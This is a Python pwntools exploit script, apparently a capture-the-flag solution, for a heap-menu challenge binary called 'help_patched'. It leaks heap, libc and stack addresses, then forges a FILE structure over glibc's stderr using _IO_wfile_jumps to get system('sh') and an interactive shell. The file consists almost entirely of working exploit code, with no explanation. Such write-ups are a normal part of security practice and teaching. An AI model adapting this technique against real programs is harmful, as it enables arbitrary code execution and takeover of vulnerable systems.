#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('help_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

sl(b'malloc')

sl(b'free')

sl(b'malloc')

sl(b'puts')

p.recvuntil(b'exit\n')

heap_leak = u64( p.recvline()[:-1] + b'\0\0\0') << 12
heap_base = (heap_leak) - 0x1000
info("heap leak: " + hex(heap_leak))
info("heap base: " + hex(heap_base))

sl(b'scanf')

for i in range(18):
    sl(b'malloc')

# # main: 0x55555555546d

load = flat(
    b'puts'.ljust(8, b'\0'),
    heap_base +0x718
)

sl(load)

libc_leak = u64(p.recvline()[:-1].ljust(8, b'\0'))
libc.address = libc_leak - 0x2044e0
info(f'libc leak : {hex(libc_leak)}')
info(f'libc base : {hex(libc.address)}')

load = flat(
    b'puts'.ljust(8, b'\0'),
    libc.sym.environ
)

sl(load)

stack_leak = u64(p.recvline()[:-1].ljust(8, b'\0'))
info(f'stack leak : {hex(stack_leak)}')

for i in range(6):
    sl(b'malloc')

sl(b'scanf')

load = flat(
    libc.sym.system,
    0,
    heap_base +0x1f68
)

sl(load)

load = flat(
    b'scanf'.ljust(8, b'\0'),
    b'A'*0x30,
    # overwrite heap ptr
    libc.sym._IO_2_1_stderr_+160
)

# input()

sl(load)

# scanf input
load = flat(
    heap_base +0x1f00, # overwrite wdata
    b'\0'*0x30,
    libc.sym._IO_wfile_jumps, # vtable
)
# input()
sl(load)

load = flat(
    b'scanf'.ljust(8, b'\0'),
    b'A'*0x30,
    # overwrite heap ptr
    libc.sym._IO_2_1_stderr_
)

sl(load)

load = flat(
    0x3b01010101010101,
    b'sh',
    p64(0)*4,
    heap_base
)

sl(load)
sl(b'exit')
# # main: 0x55555555546d
# # 0xd8 / IO file


# _IO_wfile_overflow

# # input()
# # puts+121
# # 0x55555555546
# # _IO_wdoallocbuf+45
# sl(load)





p.interactive()